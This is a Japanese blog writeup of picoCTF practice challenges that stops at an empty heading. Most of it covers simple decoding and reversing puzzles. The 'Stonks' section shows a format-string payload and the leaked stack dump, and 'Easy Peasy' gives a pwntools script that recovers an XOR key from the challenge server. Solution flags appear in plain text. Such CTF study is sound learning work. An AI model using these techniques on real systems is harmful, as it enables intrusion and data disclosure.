picoCTFの過去問を解いた際に書いたwriteup。  
※flagを伏せていたり伏せていなかったりするのは方針変更による。

picoCTF 2024の問題についてはこちら。

[https://everykalax.hateblo.jp/entry/2024/03/27/123628:embed:cite]

<details>
<summary>目次はこちら（記事長くなってきたので格納）</summary>

[:contents]

</details>

## ~49pt

### Obedient Cat (general, 5)

ダウンロードしたファイルにflagが書かれている。

### Mod 26 (crypto, 10)

flagがROT13で暗号化されているので、復号してやればいい。ROT13はシーザー暗号みたいなもので、平文に含まれるアルファベットをそれぞれ13文字分後ろにずらすことで暗号化している。
標準入力から暗号文を受け取り、復号文を出力するC++プログラムを以下に示す。

（注意）
以下のコードでは暗号文を13文字分**後ろに**ずらしているので、復号ではなく暗号化しているのでは？　と思われるかもしれない。
しかしアルファベットは26文字（a, b, ..., z）なので、13文字後ろにずらしても前にずらしても結果は変わらない（例: aを後ろに13文字ずらすとn, 前にずらしてもn）。今回は簡単のため後ろにずらしている（負数のmodよりも正数のmodのほうがやりやすいので）。

```cpp
#include <iostream>
#include <string>
using namespace std;

int main() {
        const int move = 13; // ずらす文字数

        string s;
        cin >> s;

        for (char c : s) {
                if (c >= 'a' && c <= 'z') {
                        c = ((c - 'a') + move) % 26 + 'a'; // アルファベット26文字
                } else if (c >= 'A' && c <= 'Z') {
                        c = ((c - 'A') + move) % 26 + 'A'; // アルファベット26文字
                }
                cout << c;
        }

        cout << endl;
        return 0;
}
```

### Python Wrangling (general, 10)

問題文から`ende.py`, `pw.txt`, `flag.txt.en`をダウンロードする。
そのままende.pyを実行すると、`ende.py -e/-d ファイル名`の形式で実行してくれと言われる。しかし、オプション`-e`, `-d`はどういう意味なのかわからない（予想つく方も多いと思うが）。
ende.pyのソースを覗くと、`--help`オプションをつけて実行すればヘルプが表示されるようである。
その通り実行すると、ファイルを復号する際は`python ende.py -d ファイル名`を実行すればよいことがわかる。これに則り、`python ende.py -d flag.txt.en`を実行すればよい。

### Wave a flag (general, 10)

問題文から`warm`ファイルをダウンロードする。
まず、このファイルがどんなファイルかを調べるために`file`コマンドを実行すると、64bit実行可能ファイルであることがわかる。実行可能ファイルとは、非常にざっくりと説明してしまうと、C言語ソースファイルを`gcc`でコンパイルした際にできる`a.out`と同じである。なので、`warm`ファイルに`chmod`で実行権限を付与し、`./warm`のように打ち込めば実行できる。
実行すると`-h`オプションをつけろといわれるので、それに従えばflagが入手できる。

### information (forensics, 10)

`head`コマンドなどで画像のバイナリの先頭部分を見ると、xmlのような構文の箇所がある。そのうち、以下に示す部分に怪しい文字列（`cGlj...`）が見える。

`<cc:license rdf:resource='cGljb0NURnt0aGVfbTN0YWRhdGFfMXNfbW9kaWZpZWR9'/>`

怪しい文字列`cGljb0NURnt0aGVfbTN0YWRhdGFfMXNfbW9kaWZpZWR9`をbase64でデコードすることでflagが得られる。
（base64ということに気づけずにwriteup見ました）

### Nice netcat... (general, 15)

問題文にあるコマンドを実行すると何やら数列が得られる。ASCIIコードっぽいので変換すると、flagが現れる。

もう少し詳しく説明する。`nc mercury.picoctf.net 21135 > log.txt`で数列を`log.txt`というファイルに出力・保存し、そのファイルを次に示すC++プログラムに引数として渡すことでflagを入手できる。

```cpp
#include <iostream>
#include <fstream>
#include <string>
using namespace std;

int main() {
        ifstream file("log.txt");
        string line;

        while (getline(file, line)) {
                int p = stoi(line);
                cout << (char)p;
        }

        cout << endl;
}
```

### Transformation (rev, 20)

問題文からファイル`enc`をダウンロードする。問題に書かれているコードがおそらく暗号化に使われるプログラムなので、それを参考にして復号プログラムを作成すればよい。
Pythonで作成した復号プログラムを以下に示す。

```python
enc = "灩捯䍔䙻ㄶ形楴獟楮獴㌴摟潦弸彤㔲挶戹㍽"
flag = ""

for e in enc:
        e_ascii = ord(e)
        flag += (chr(e_ascii >> 8))
        flag += (chr(e_ascii % (1 << 8)))

print(flag)
```

### Stonks (binary, 20)

**点数にしては異様に難しいので、しばらく放置したほうがよい。**

ソースコード`vuln.c`を読むと、93行目で書式文字列攻撃を行えることがわかる。つまり入力として`%x`や`%s`といった書式文字列を与えることで、スタックの中身を出力させることが可能である。

```terminal
$ grep user vuln.c -n
89:     char *user_buf = malloc(300 + 1);
91:     scanf("%300s", user_buf);
93:     printf(user_buf);
```

また、67行目あたりでflagが書かれたファイルを読み込んでいるようだ。

```terminal
$ grep Flag vuln.c -n -C 3
66-     char api_buf[FLAG_BUFFER];
67-     FILE *f = fopen("api","r");
68-     if (!f) {
69:             printf("Flag file not found. Contact an admin.\n");
70-             exit(1);
71-     }
72-     fgets(api_buf, FLAG_BUFFER, f);
```

これらの情報から、書式文字列攻撃で`api_buf`を出力させることができれば、flagを得ることができそうだ。とりあえずスタック上のデータを大量に出力させてみる。

```terminal
$ nc mercury.picoctf.net 6989
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,
Buying stonks with token:
08f67350,0804b000,080489c3,f7f14d80,ffffffff,00000001,08f65160,f7f22110,f7f14dc7,00000000,08f66180,00000018,08f67330,08f67350,6f636970,7b465443,306c5f49,345f7435,6d5f6c6c,306d5f79,5f79336e,35386130,32356533,ffea007d,f7f4faf8,f7f22440,964ff500,00000001,00000000,f7db1ce9,f7f230c0,f7f145c0,f7f14000,ffeabbc8,f7da268d,f7f145c0,08048eca,ffeabbd4,00000000,f7f36f09,0804b000,f7f14000,f7f14e20,ffeabc08,f7f3cd50,f7f15890,964ff500,f7f14000,0804b000,ffeabc08,08048c86,08f65160,ffeabbf4,ffeabc08,08048be9,f7f143fc,00000000,ffeabcbc,ffeabcb4,00000001,
Portfolio as of Sat Apr 13 06:23:06 UTC 2024


24 shares of KM
63 shares of VRZW
104 shares of C
Goodbye!
```

出力をよく見てみると、`0x6*`から始まる部分が多く見つかる。具体的には以下の部分である。

```txt
6f636970,7b465443,306c5f49,345f7435,6d5f6c6c,306d5f79,5f79336e,35386130,32356533,ffea007d
```

これをasciiコードとみなして文字列に変換すると以下のような結果が得られ、flagが手に入る。  
※CyberChefを利用した。 → <https://gchq.github.io/CyberChef/#recipe=Fork(',','',false)From_Hex('Auto')Reverse('Character')&input=NmY2MzY5NzAsN2I0NjU0NDMsMzA2YzVmNDksMzQ1Zjc0MzUsNmQ1ZjZjNmMsMzA2ZDVmNzksNWY3OTMzNmUsMzUzODYxMzAsMzIzNTY1MzMsZWEwMDdk&oeol=CR>

```txt
picoCTF{I_l05t_4ll_my_m0n3y_0a853e52}\x00êÿ
```

### GET aHEAD (web, 20)

ボタンを押すと一方はGETで、もう一方はPOSTでリクエストが送られる。curlなどを用いてHEADでリクエストを送ることでflagが得られる。
（わからなかったのでwrite_upを読んだ）

### Mind your Ps and Qs (crypto, 20)

nが小さいので適当なサイトで素因数分解してp, qを得る。そしたらΦ = lcm(p-1, q-1)を求め、d = pow(e, -1, Φ)を求めれば、平文mがpow(c, d, n)として求まる。
この後どうすればよいのかがわからなかったのでwrite_upを読んだら、求めたmをバイト列とみなし、文字列に変換すればフラグが出てくるらしい。Cryptoモジュールにあるlong_to_bytes()関数を使うと楽とのこと。

ちなみに`math.lcm()`はpython3.9から追加された関数なので、それ以前のバージョンを使っている場合は、`math.lcm(a, b) = a*b // math.gcd(a, b)`として求まる。

### Static ain't always noise (general, 20)

`ltdis.sh`にファイル`static`を渡して実行すると2つのtxtファイルが生成される。そのtxtファイルの中にflagが書かれている。

### Tab, Tab, Attack (general, 20)

zipファイルを解凍すると多階層のファイルができる。その最深部にあるファイルを実行すればflagが入手できる。

### Super SSH (general, 25)

SSH接続するだけ。

```terminal
$ ssh ctf-player@titan.picoctf.net -p 49226
The authenticity of host '[titan.picoctf.net]:49226 ([3.139.174.234]:49226)' can't be established.
ED25519 key fingerprint is SHA256:4S9EbTSSRZm32I+cdM5TyzthpQryv5kudRP9PIKT7XQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '[titan.picoctf.net]:49226' (ED25519) to the list of known hosts.
ctf-player@titan.picoctf.net's password:
Welcome ctf-player, here's your flag: picoCTF{s3cur3_c0nn3ct10n_65a7a106}
Connection to titan.picoctf.net closed.
```

### keygenme-py (rev, 30)

定義された定数より、flagは`picoCTF{1n_7h3_|<3y_of_xxxxxxxx}`という形式であるとわかる（xxx…はわからない部分）。
`check_key()`という関数の中でflagの照合処理が行われており、そのうちxxx…の部分は

```python
if key[i] != hashlib.sha256(username_trial).hexdigest()[4]:
    return False
else:
    i += 1
```

が延々と続く部分で照合されているようだ。なので、

```python
hashlib.sha256(username_trial).hexdigest()[4]
```

を順番通りにprintしてやればxxx…の部分がわかる。具体的には、

```python
import hashlib
from cryptography.fernet import Fernet
import base64

username_trial = b"FRASER"

print(hashlib.sha256(username_trial).hexdigest()[4])
print(hashlib.sha256(username_trial).hexdigest()[5])
print(hashlib.sha256(username_trial).hexdigest()[3])
print(hashlib.sha256(username_trial).hexdigest()[6])
print(hashlib.sha256(username_trial).hexdigest()[2])
print(hashlib.sha256(username_trial).hexdigest()[7])
print(hashlib.sha256(username_trial).hexdigest()[1])
print(hashlib.sha256(username_trial).hexdigest()[8])
```

のようなコードを実行してやればよい。

ここで`username_trial = "FRASER"`ではなく、`b"FRASER"`としたことに注意する。これは、関数`check_key()`に渡されたのが`bUsername_trial`（=`b"FRASER"`）だからである。

### Matryoshka doll (forensics, 30)

ダウンロードしたjpg画像の形式をfileコマンドで調べたが、pngファイルであること以外に情報は得られなかった。stringsコマンドを用いて内容を見てみると`base_images/2_c.jpg`という文字列が見つかったが、詳しくはわからなかった。
問題タイトルからして、画像内に画像が隠されているパターンだと予想したため、binwalkを利用して調べていく。`binwalk doll.jpg`と打つと隠されたzipファイルが見つかったため、`binwalk -e doll.jpg`で隠しファイルを抽出する。見つかった画像ファイル`2_c.jpg`に対してもbinwalkで解析を行い、`3_c.jpg`を得る。これを何度も繰り返すと、最終的に画像ファイル`4_c.jpg`からflagを入手することができる。

### crackme-py (rev, 30)

プログラム見ると復号用関数がすでに定義されているので、そいつを使うようにプログラムを書き換えるだけでflagが得られる。
具体的にはプログラム最下部の`choose_greatest()`を削除し、代わりに`decode_secret(bezos_cc_secret)`を追記すればよい。

### Magikarp Ground Mission (general, 30)

SSH接続し、`instruction`というファイルに沿ってflagを探せばよい。

```terminal
$ ssh ctf-player@venus.picoctf.net -p 58988
ctf-player@venus.picoctf.net's password:
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 5.4.0-1041-aws x86_64)

（中略）

ctf-player@pico-chall$ ls
1of3.flag.txt  instructions-to-2of3.txt
ctf-player@pico-chall$ cat 1of3.flag.txt
picoCTF{xxsh_
ctf-player@pico-chall$ cat instructions-to-2of3.txt
Next, go to the root of all things, more succinctly `/`
ctf-player@pico-chall$ cd /
ctf-player@pico-chall$ ls
2of3.flag.txt  dev   instructions-to-3of3.txt  media  proc  sbin  tmp
bin            etc   lib                       mnt    root  srv   usr
boot           home  lib64                     opt    run   sys   var
ctf-player@pico-chall$ cat 2of3.flag.txt
0ut_0f_\/\/4t3r_
ctf-player@pico-chall$ cat instructions-to-3of3.txt
Lastly, ctf-player, go home... more succinctly `~`
ctf-player@pico-chall$ cd ~
ctf-player@pico-chall$ ls
3of3.flag.txt  drop-in
ctf-player@pico-chall$ cat 3of3.flag.txt
71be5264}
```

### tunn3l v1s10n (forensics, 40)

bmpということまではわかったが無理だった。以下を見た。

- <https://qiita.com/housu_jp/items/bb0d41be153e7ee2b148>
- <https://tsalvia.hatenablog.com/entry/2021/04/08/110000#tunn3l-v1s10n---40-points>
- <https://qiita.com/chooyan_eng/items/151e67684e5ef8d1a695>
- <https://github.com/Dvd848/CTFs/blob/master/2021_picoCTF/tunn3l_v1s10n.md>

### Cookies (web, 40)

入力欄にsnickerdoodleと入れてSearchボタンを押すと、`I love snickerdoodle cookies!`と表示される。
問題名から推測して、ブラウザに保存されているCookieを見てみる（devtoolではアプリケーションの項に書いてある）と、nameという名前のCookieが保存されていることがわかる。
このCookieは、snickerdoodleと入力した際は値が0となり、適当な文字列を入力した際は1となる。
（ここで詰まりギブアップ、write_upを見る）
ここから推測するに、このCookieの値を書き換えたら別の出力が得られるのではないか。
というわけで値を2にして再読み込みすると、今度は`I love oatmeal raisin cookies!`と表示された。この調子で値を書き換えながら確認していくと、値を18にした際にflagが得られる。

### ARMssembly 0 (rev, 40)

ヒントを見ると単純な比較とあるので、与えられた数のどちらかを入力すればflagが得られるはず。

比較といったら`cmp`命令なので探すと、`func1`という関数内にあった。

［問題コードの一部抜粋］

```asm
func1:
        sub     sp, sp, #16
        str     w0, [sp, 12]
        str     w1, [sp, 8]
        ldr     w1, [sp, 12]
        ldr     w0, [sp, 8]
        cmp     w1, w0
        bls     .L2
        ldr     w0, [sp, 12]
        b       .L3
.L2:
        ldr     w0, [sp, 8]
.L3:
        add     sp, sp, 16
        ret
        .size   func1, .-func1
        .section        .rodata
        .align  3
```

読めないが、おそらくw0,w1に1,2つ目の引数がそれぞれ入り、`cmp`で比較して、`ls`つまり`w1`のほうが小さいなら`.L2`に、`w0`が小さいなら`w0`に`w1`の値を代入してから`.L3`に飛ぶ。`.L2`では`w0`に`w0`の値が代入される？ `.L3`ではとくに`w0, w1`に関係する処理はしていないように見える。
以上を踏まえると、この関数では引数のうち大きい方が返されるようだ。というわけで引数のうち大きい方を16進変換してflagとして提出すればよい。

参考:

- <https://tsalvia.hatenablog.com/entry/2021/04/08/110000#ARMssembly-0---40-points>
- <https://kashiwaba-yuki.com/ctf-arm-assembly-bigginer>

ARMアセンブリの命令については以下が非常に参考になった。

- <https://www.mztn.org/dragon/arm6400idx.html>
- <https://www.mztn.org/dragon/arm6408cond.html>

### Easy Peasy (crypto, 40)

keyと入力をXORしたものを暗号として返すが、keyが50000文字もあり、それまでの入力文字数によって使うkeyの部分がずれていく。
具体的には、

- 最初にプログラム側でflag（32文字）が暗号化されるのでkeyの1～32文字目が使用される
- 次にユーザが10文字の入力を行ったとすると、keyの33～42文字目が使用される

のように処理が行われる。
こういった処理のため、flagを復号するには、keyの1～32文字目が必要となる。そのため、

1. `50000-32`文字の適当な文字列を入力してkeyの開始位置を最初に戻す
2. `aaaa...`という32文字の文字列を入力して暗号文を得る
3. その暗号文と`aaaa...`をXORすることでkeyの1～32文字目を得る
4. keyと暗号化されたflagをXORしてもとのflagを得る

という作戦でflagを得ることができる。
使用したプログラムを以下に示す。

```python
from pwn import *
from binascii import unhexlify

# サーバに接続
io = remote("mercury.picoctf.net", 36981)

# 暗号化されたflagを得る
## unhexlifyを使うことで、b"1234"をb"\x12\x34"という形式に変換できる
io.recvline()
io.recvline()
flag_enc: bytes = unhexlify(io.recv(64))

# 適当な文字列を入力してkeyの開始位置を0に戻す
io.recvuntil(b"encrypt? ")
io.sendline(b"a" * (50000-32))

# aaaa...を暗号化した文字列を得る
io.recvuntil(b"encrypt? ")
io.sendline(b"a" * 32)
io.recvline()
a_enc: bytes = unhexlify(io.recv(64))

# aaaa...を暗号化したものと、aaaa...をXORしてkeyを得る
key: bytes = bytes(e ^ a for e, a in zip(a_enc, b"a"*32))
# flagを暗号化したものとkeyをXORしてflagを得る
flag: bytes = bytes(f ^ k for f, k in zip(flag_enc, key))

print(flag)
```

これを実行するとflagの中身が得られるから、これを`picoCTF{}`で囲めばよい。

```terminal
$ python3 un_otp.py
[+] Opening connection to mercury.picoctf.net on port 36981: Done
b'7f9da29f40499a98db220380a57746a4'
[*] Closed connection to mercury.picoctf.net port 36981
```

`picoCTF{7f9da29f40499a98db220380a57746a4}`

## 50pt

### vault-door-training (rev, 50)

ダウンロードしたjavaソースコードにflagが書かれている。

### Insp3ct0r (web, 50)

指定されたサイトのhtml/css/javascriptソースコードそれぞれに分割されたflagが書かれているので、それらをつなぎ合わせればよい。

### Lets Warm Up (general, 50)

16進数の0x70をASCIIコードとして見ると、どの文字に該当するかを考え、その文字をそのままflagとして提出すればよい。
たとえば、文字`A`に該当すると思ったら、`picoCTF{A}`を提出すればよい。

### Glory of the Garden (forensics, 50)

ダウンロードした画像は、fileコマンドで調べてもおかしな点がないので、「実はzipファイルでした～」というような状況は除外できる。画像を見ても変わった様子はない。
そのため、とりあえずstringsでバイナリ中の文字列を抽出したところ、flagが現れた。

### Warmed Up (general, 50)

「16進数の0x3Dは10進数で何でしょう？」の答えをflagとして提出すればよい。

### The Numbers (crypto, 50)

画像中に書かれている数列は{16, 9, 3, 15, 3, 20, 6, 20, 8, 5, 14, 21, 13, 2, 5, 18, 19, 13, 1, 19, 15, 14}である。これをよく見ると、アルファベットで16番目の文字はp, 9番目はi, 3番目はc, ... となっており、フラグ文字列であることに気づく。そこに気づければ、あとは適当に変換プログラムを書くか、自力でどうにか変換するかすればよい。

### 2Warm (general, 50)

10進数の42を2進数に直し、その値をflagとして提出すればよい。windowsなら標準の電卓で計算できるし、10進 → 2進変換プログラムを自前で作成してもよい。

### Wireshark doo dooo do doo... (forensics, 50)

WireSharkで適当にパケットを流し見していると、No.827のパケット（Time=7.236537）に含まれるデータに、flagらしきものを見つけた。以下に示す。

```txt
Gur synt vf cvpbPGS{c33xno00_1_f33_h_qrnqorrs}\n
```

シーザー暗号なので変換すればよい。

### speeds and feeds (rev, 50)

指定されたサーバに`nc`で接続すると何らかの文字列が出力された。
よく見てみると`G0X000Y000`という書式が多く出ているため、グラフの座標を表しているのではないかと考えた。

ヒントを見るとCNCマシンで使われる言語であるという記載があったため、Wikipediaで調べると`Gコード`とわかった。
<https://ja.wikipedia.org/wiki/%E3%82%B3%E3%83%B3%E3%83%94%E3%83%A5%E3%83%BC%E3%82%BF%E6%95%B0%E5%80%A4%E5%88%B6%E5%BE%A1>

オンライン上でGコードを実行できるサイト（以下リンク）があったので、そちらを利用したところ、flagが描画された。
<https://ncviewer.com>

### Shop (rev, 50)

ダウンロードした実行可能ファイルで遊んでいたら、偶然商品をマイナス個買えることに気づいた。
このバグを用いて、適当な商品をマイナス個買って所持金を増やせば、flagが購入できる。

flagを購入すると以下の出力が得られる。

```txt
Flag is: [112 105 99 111 67 84 70 123 98 52 100 95 98 114 111 103 114 97 109 109 101 114 95 51 100 97 51 52 97 56 102 125]
```

例によってASCII文字コードと思われるので、変換してやればflagが得られる。

Pythonによる変換プログラムを以下に載せておく。

```python
# "flag"はさっきの出力(112 105 99...)が書かれたテキストファイル
with open("flag", "r") as f:
 line = f.readline()

ans = ""
chars = line.split()
for c in chars:
 ans += chr(int(c))
print(ans)
```

### Scavenger Hunt (web, 50)

Insp3ct0rと同じような問題だが、こちらのほうが難易度は高い。flagが5つに分割されているからである。

まずhtml/cssファイルそれぞれに分割されたflagが書かれている。
次にjsファイルを見ると、「Googleにインデックスされないようにするにはどうすればよいでしょう？」とある。これは`robots.txt`の存在を示唆している。実際に<http://mercury.picoctf.net:39698/robots.txt>に飛ぶと、3つ目のflagが得られる。
それと同時に、次のflagのヒントも得られる。「このサイトはapacheサーバを利用しています、次のflagはどこにあるでしょう？」とあるが、これは`.htaccess`ファイルを示すものである。<http://mercury.picoctf.net:39698/.htaccess>に飛ぶと4つ目のflagが得られる。
さらにそれと同時に、5つ目のflagのヒントも得られる。「Macでサイト作成している」という情報から、Mac特有のファイルについて調べると、`.DS_Store`というファイルに行きつく。<http://mercury.picoctf.net:39698/.DS_Store>に移動することで、最後のflagを得る。

## 51~99pt

### MacroHard WeakEdge (forensics, 60)

pptmファイルはzip形式として解凍できる。解凍すると`ppt`というディレクトリに`vbaProject`というファイルができるが、これがVBAマクロの実体らしい。

これを解析してみたが何もわからず。ヒントもなかったのでしょうがなくwriteupを見ると`ppt/slideMasters/`にある`hidden`というファイルをbase64デコードすればよいとのこと。

確かによく見たら問題文にもhiddenって書いてあった…

見たwriteup: <https://ctftime.org/writeup/26975>

### New Caesar (crypto, 60)

文字列を`b16_encode()`に入れ、その出力を1文字ずつ`shift()`関数に渡すことで暗号文を作成している。つまりこれを逆順に行えば暗号文を復号できる。

ここで暗号文のほかに`key`が必要である点に注意する。しかし配布されたPythonスクリプトに`assert len(key) == 1`とあるように、今回は`key`が1文字であることがわかっているので、総当たりですべての`key`を試せばよい。

以下に作成したスクリプトを示す。

```python
import string
from binascii import unhexlify

LOWERCASE_OFFSET = ord("a")
ALPHABET = string.ascii_lowercase[:16] # abcdefghijklmnop

def b16_encode(plain):
  enc = ""
  for c in plain:
    binary = "{0:08b}".format(ord(c))
    enc += ALPHABET[int(binary[:4], 2)]
    enc += ALPHABET[int(binary[4:], 2)]
  return enc

def b16_decode(enc: str) -> bytes:
  plain: str = ""
  for i, e in enumerate(enc):
    plain += hex(ord(e) - LOWERCASE_OFFSET)[2:]
  plain_b: bytes = bytes.fromhex(plain)
  return plain_b

def shift(c, k):
  t1 = ord(c) - LOWERCASE_OFFSET
  t2 = ord(k) - LOWERCASE_OFFSET
  return ALPHABET[(t1 + t2) % len(ALPHABET)]

def unshift(c: str, k: str) -> str:
  t1: int = ord(c) - LOWERCASE_OFFSET
  t2: int = ord(k) - LOWERCASE_OFFSET
  return ALPHABET[(t1 - t2) % len(ALPHABET)]

# flag = "redacted"
# key = "redacted"
# assert all([k in ALPHABET for k in key])
# assert len(key) == 1

# b16 = b16_encode(flag)
# enc = ""
# for i, c in enumerate(b16):
#   enc += shift(c, key[i % len(key)])
# print(enc)

for key in ALPHABET:
  flag_enc: str = "dcebcmebecamcmanaedbacdaanafagapdaaoabaaafdbapdpaaapadanandcafaadbdaapdpandcac"
  b16: str = ""
  for i, c in enumerate(flag_enc):
    b16 += unshift(c, key)
  plain_b: bytes = b16_decode(b16)
  print(key, plain_b)
```

これを実行し、ちゃんと復号できてそうなもの（UTF-8として解釈できているもの）を選ぶ。

```terminal
$ python3 new_caesar.py
a b'2A,AB\x0c,\r\x041\x020\r\x05\x06\x0f0\x0e\x01\x00\x051\x0f?\x00\x0f\x03\r\r2\x05\x0010\x0f?\r2\x02'
b b'!0\x1b01\xfb\x1b\xfc\xf3 \xf1/\xfc\xf4\xf5\xfe/\xfd\xf0\xff\xf4 \xfe.\xff\xfe\xf2\xfc\xfc!\xf4\xff /\xfe.\xfc!\xf1'
c b'\x10/\n/ \xea\n\xeb\xe2\x1f\xe0\x1e\xeb\xe3\xe4\xed\x1e\xec\xef\xee\xe3\x1f\xed\x1d\xee\xed\xe1\xeb\xeb\x10\xe3\xee\x1f\x1e\xed\x1d\xeb\x10\xe0'
d b'\x0f\x1e\xf9\x1e\x1f\xd9\xf9\xda\xd1\x0e\xdf\r\xda\xd2\xd3\xdc\r\xdb\xde\xdd\xd2\x0e\xdc\x0c\xdd\xdc\xd0\xda\xda\x0f\xd2\xdd\x0e\r\xdc\x0c\xda\x0f\xdf'
e b'\xfe\r\xe8\r\x0e\xc8\xe8\xc9\xc0\xfd\xce\xfc\xc9\xc1\xc2\xcb\xfc\xca\xcd\xcc\xc1\xfd\xcb\xfb\xcc\xcb\xcf\xc9\xc9\xfe\xc1\xcc\xfd\xfc\xcb\xfb\xc9\xfe\xce'
f b'\xed\xfc\xd7\xfc\xfd\xb7\xd7\xb8\xbf\xec\xbd\xeb\xb8\xb0\xb1\xba\xeb\xb9\xbc\xbb\xb0\xec\xba\xea\xbb\xba\xbe\xb8\xb8\xed\xb0\xbb\xec\xeb\xba\xea\xb8\xed\xbd'
g b'\xdc\xeb\xc6\xeb\xec\xa6\xc6\xa7\xae\xdb\xac\xda\xa7\xaf\xa0\xa9\xda\xa8\xab\xaa\xaf\xdb\xa9\xd9\xaa\xa9\xad\xa7\xa7\xdc\xaf\xaa\xdb\xda\xa9\xd9\xa7\xdc\xac'
h b'\xcb\xda\xb5\xda\xdb\x95\xb5\x96\x9d\xca\x9b\xc9\x96\x9e\x9f\x98\xc9\x97\x9a\x99\x9e\xca\x98\xc8\x99\x98\x9c\x96\x96\xcb\x9e\x99\xca\xc9\x98\xc8\x96\xcb\x9b'
i b'\xba\xc9\xa4\xc9\xca\x84\xa4\x85\x8c\xb9\x8a\xb8\x85\x8d\x8e\x87\xb8\x86\x89\x88\x8d\xb9\x87\xb7\x88\x87\x8b\x85\x85\xba\x8d\x88\xb9\xb8\x87\xb7\x85\xba\x8a'
j b'\xa9\xb8\x93\xb8\xb9s\x93t{\xa8y\xa7t|}v\xa7uxw|\xa8v\xa6wvztt\xa9|w\xa8\xa7v\xa6t\xa9y'
k b'\x98\xa7\x82\xa7\xa8b\x82cj\x97h\x96ckle\x96dgfk\x97e\x95feicc\x98kf\x97\x96e\x95c\x98h'
l b'\x87\x96q\x96\x97QqRY\x86W\x85RZ[T\x85SVUZ\x86T\x84UTXRR\x87ZU\x86\x85T\x84R\x87W'
m b'v\x85`\x85\x86@`AHuFtAIJCtBEDIuCsDCGAAvIDutCsAvF'
n b'et_tu?_07d5c0892c1438d2b32600e83dc2b0e5'
o b'TcNcd.N/&S$R/\'(!R #"\'S!Q"!%//T\'"SR!Q/T$'
p b'CR=RS\x1d=\x1e\x15B\x13A\x1e\x16\x17\x10A\x1f\x12\x11\x16B\x10@\x11\x10\x14\x1e\x1eC\x16\x11BA\x10@\x1eC\x13'
```

この中だと`key=n`の際の`et_tu?_07d5c0892c1438d2b32600e83dc2b0e5`がそれっぽい。提出したら正解だった。
※おそらく`et_tu?`というのは「ブルータス、お前もか？（Et tu, Brute?）」から来ている

`picoCTF{et_tu?_07d5c0892c1438d2b32600e83dc2b0e5}`

### ARMssembly1 (rev, 70)

コード量が多い。おまけに変なミスをした（後述）せいで解くのに時間がかかった。

```asm
 .arch armv8-a
 .file "chall_1.c"
 .text
 .align 2
 .global func
 .type func, %function
func:            @ アットマークはコメント行
 sub sp, sp, #32      @ spから32引く、#は即値の意味
 str w0, [sp, 12]     @ w0(入力された引数)を[sp,12]のレジスタに入れる
 mov w0, 87        @ w0に87を代入
 str w0, [sp, 16]     @ w0を[sp,16]に入れる
 mov w0, 3         @ w0に3を代入
 str w0, [sp, 20]     @ w0を[sp,20]に入れる
 mov w0, 3         @ w0に3を代入
 str w0, [sp, 24]     @ w0を[sp,24]に入れる
 ldr w0, [sp, 20]     @ w0に[sp,20] = 3を代入
 ldr w1, [sp, 16]     @ w1に[sp,16] = 87を代入
 lsl w0, w1, w0      @ 論理左シフト、w1(87)をw0(3)bitだけ左シフトしてw0に入れる(696)
 str w0, [sp, 28]     @ w0を[sp,28]に入れる
 ldr w1, [sp, 28]     @ w1に[sp,28] = 696を代入
 ldr w0, [sp, 24]     @ w0に[sp,24] = 3を代入
 sdiv w0, w1, w0     @ 符号付き整数の除算、w1(696)/w0(3) = 232をw0に代入
 str w0, [sp, 28]     @ w0を[sp,28]に入れる
 ldr w1, [sp, 28]     @ w1に[sp,28] = 232を代入
 ldr w0, [sp, 12]     @ w0に[sp,12] = (入力)を代入
 sub w0, w1, w0      @ w1(232)-w0(入力)をw0に代入
 str w0, [sp, 28]     @ w0を[sp,28]に入れる
 ldr w0, [sp, 28]     @ w0に[sp,28]を代入
 add sp, sp, 32      @ spに32を足す
 ret            @ 終了
 .size func, .-func
 .section .rodata
 .align 3
.LC0:
 .string "You win!"
 .align 3
.LC1:
 .string "You Lose :("
 .text
 .align 2
 .global main
 .type main, %function
main:
 stp x29, x30, [sp, -48]! @ プレインデックスのストア、x29とx30を[sp, -48]に退避
 add x29, sp, 0      @ x29にspを代入
 str w0, [x29, 28]     @ w0を[x29, 28]に入れる
 str x1, [x29, 16]     @ x1を[x29, 16]に入れる
 ldr x0, [x29, 16]     @ x0に[x29, 16]を入れる
 add x0, x0, 8       @ x0に8を足す
 ldr x0, [x0]       @ x0に[x0]を代入
 bl atoi         @ atoi(x0)
 str w0, [x29, 44]     @ w0を[x29, 44]に入れる
 ldr w0, [x29, 44]     @ w0に[x29, 44]を代入
 bl func         @ func(w0)
 cmp w0, 0         @ w0と0を比較
 bne .L4          @ w0 != 0なら.L4を呼ぶ
 adrp x0, .LC0      @ ラベル.LC0の位置のアドレスをx0に代入
 add x0, x0, :lo12:.LC0  @ x0に.LC0の絶対値?を足す
 bl puts
 b .L6
.L4:
 adrp x0, .LC1
 add x0, x0, :lo12:.LC1
 bl puts
.L6:
 nop
 ldp x29, x30, [sp], 48
 ret
 .size main, .-main
 .ident "GCC: (Ubuntu/Linaro 7.5.0-3ubuntu1~18.04) 7.5.0"
 .section .note.GNU-stack,"",@progbits
```

main関数内で、`func`が呼ばれたあとに`w0`が0か判定しており、0であれば`You win!`と表示される。そのため、func関数で処理したw0の値が0となればよい。
`func`の最後で`sub w0, w1, w0`、つまり`w0 = w1(232) - w0(入力)`が実行されているから、この結果`w0 = 0`とするには、`入力 = w0 = w1 = 232`であればよい。したがって提出するflagは`232`を16進数にしてflagフォーマットに合わせた文字列となる。

`lsl w0, w1, w0`でw1を8bitでパディングしていたせいでずっと間違えていた。正しくは32bitパディングである。
確かに`w`がつくレジスタは32bitであるとどこかで聞いた気がする。

### Some Assembly Required 1 (web, 70)

（正答者数に比べて解法が簡単すぎるので、想定解ではないかもしれない）

devtoolsを開きソースを確認すると、`wasm/a784ba16`というファイルがあることに気づく。そのファイルの最下部にflagが書かれている。

### Mini RSA (crypto, 70)

